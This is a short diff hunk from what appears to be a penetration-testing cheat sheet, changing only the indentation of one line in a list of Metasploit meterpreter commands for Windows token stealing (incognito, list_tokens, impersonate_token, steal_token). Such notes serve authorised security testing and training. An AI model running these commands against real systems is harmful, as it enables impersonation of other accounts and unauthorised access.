@@ -122,7 +122,7 @@ Metaslpoit
         *> session -i 1*
         Token stealing
         *> use incognito
-        >list_tokens -u*
+>list_tokens -u*
         >impersonate_token BOB\IWAM_BOB
         >ps
         >steal_token [PID]
